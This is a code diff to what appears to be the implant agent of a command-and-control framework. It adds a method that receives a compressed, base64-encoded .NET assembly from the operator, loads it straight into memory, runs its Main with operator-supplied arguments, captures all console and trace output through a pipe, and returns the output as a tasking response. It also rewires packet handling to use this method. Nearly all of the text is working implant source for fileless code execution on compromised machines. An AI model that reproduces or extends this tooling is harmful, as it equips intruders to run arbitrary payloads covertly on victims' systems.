@@ -668,12 +668,9 @@ class MainAgent:
 
                     pipe_client.Dispose()
 
-            exec_thread = Thread(target=exec_main_with_piped_console)
-            exec_thread.start()
-
             def _send_payload_text(text_str):
                 try:
-                    pkt = self.packet_handler.build_response_packet(120, text_str, result_id)
+                    pkt = self.packet_handler.build_response_packet(122, text_str, result_id)
                     self.packet_handler.process_job_tasking(pkt)
                     return
                 except Exception as e:
@@ -708,8 +705,8 @@ class MainAgent:
                     pipe_server.Dispose()
                     self.tasks[result_id]["status"] = "completed"
 
+            exec_thread = KThread(target=exec_main_with_piped_console)
             read_thread = KThread(target=read_loop)
-            read_thread.start()
 
             self.tasks[result_id] = {
                 "thread": exec_thread,
@@ -717,9 +714,108 @@ class MainAgent:
                 "status": "running"
             }
 
+            exec_thread.start()
+            read_thread.start()
+
         except Exception as e:
             self.tasks[result_id] = {"status": "error"}
-            err = "[!] Error while starting C# background job: %s" % str(e)
+            err = "[!] Error while running C# task: %s" % str(e)
+            pkt = self.packet_handler.build_response_packet(0, err, result_id)
+            self.packet_handler.process_job_tasking(pkt)
+
+    def csharp_exe(self, data, result_id):
+        try:
+            import base64, zlib, json, time, System as _sys
+            from collections import OrderedDict
+            import clr
+
+            from System import Array, Object, String, Char, Byte
+            from System import Console
+            from System.IO import StreamReader, StreamWriter
+            from System.Reflection import Assembly
+            from System.Diagnostics import Trace, Debug, TextWriterTraceListener
+            from System.Text import Encoding
+            clr.AddReference("System.Core")
+            import System.IO.Pipes
+
+            parts = data.split(",")
+            data_bytes = base64.b64decode(parts[0])
+
+            base64_string = ''.join(parts[1:])
+            json_string = base64.b64decode(base64_string).decode("utf-8")
+            json_object = json.loads(json_string, object_pairs_hook=OrderedDict)
+            command_array = Array[String]([str(value) for value in json_object.values()])
+
+            decoded_data = zlib.decompress(data_bytes, -15)
+            assem_bytes = Array[Byte](decoded_data)
+            assembly = Assembly.Load(assem_bytes)
+
+            pipe_server = System.IO.Pipes.AnonymousPipeServerStream(
+                System.IO.Pipes.PipeDirection.In,
+                System.IO.HandleInheritability.Inheritable
+            )
+            pipe_client = System.IO.Pipes.AnonymousPipeClientStream(
+                System.IO.Pipes.PipeDirection.Out,
+                pipe_server.GetClientHandleAsString()
+            )
+            reader = StreamReader(pipe_server, Encoding.UTF8, True, 1024)
+
+            program_type = assembly.GetType("Program")
+            output_stream_prop = program_type.GetProperty("OutputStream") if program_type is not None else None
+
+            sw = StreamWriter(pipe_client, Encoding.UTF8, 1024)
+            sw.AutoFlush = True
+
+            old_out, old_err = Console.Out, Console.Error
+            listener = TextWriterTraceListener(sw)
+            Trace.Listeners.Add(listener)
+            Debug.Listeners.Add(listener)
+
+            accum = ""
+            try:
+                Console.SetOut(sw)
+                Console.SetError(sw)
+
+                if output_stream_prop is not None:
+                    output_stream_prop.SetValue(None, pipe_client, None)
+
+                main_method = program_type.GetMethod("Main")
+                if main_method is None:
+                    accum = "[!] Error: Program.Main not found"
+                else:
+                    main_method.Invoke(None, Array[Object]([command_array]))
+
+                Console.Out.Flush()
+                Console.Error.Flush()
+                sw.Flush()
+                pipe_client.Dispose()
+
+                buf = Array.CreateInstance(Char, 1024)
+                while True:
+                    try:
+                        n = reader.Read(buf, 0, buf.Length)
+                    except Exception:
+                        n = 0
+                    if n == 0: break
+                    accum += u"".join(buf[i] for i in range(n))
+
+            except Exception as e:
+                accum += "\n[!] Exception in csharp_exe: {0}".format(str(e))
+            finally:
+                Console.SetOut(old_out)
+                Console.SetError(old_err)
+                Trace.Listeners.Remove(listener)
+                Debug.Listeners.Add(listener)
+                listener.Flush()
+                reader.Dispose()
+                pipe_server.Dispose()
+
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(120, accum, result_id))
+            self.tasks[result_id]["status"] = "completed"
+
+        except Exception as e:
+            self.tasks[result_id] = {"status": "error"}
+            err = "[!] Error while running C# task: %s" % str(e)
             pkt = self.packet_handler.build_response_packet(0, err, result_id)
             self.packet_handler.process_job_tasking(pkt)
 
@@ -1539,7 +1635,7 @@ class MainAgent:
                 self.start_python_job(data, result_id)
 
             elif packet_type == 120:
-                self.csharp_background_job(data, result_id)
+                self.csharp_exe(data, result_id)
 
             elif packet_type == 122:
                 self.csharp_background_job(data, result_id)
@@ -1623,6 +1719,7 @@ class MainAgent:
                     try:
                         self.send_job_message_buffer()
                     except Exception as e:
+                        print(e)
                         result = self.packet_handler.build_response_packet(
                             0, str("[!] Failed to check job buffer!: " + str(e))
                         )
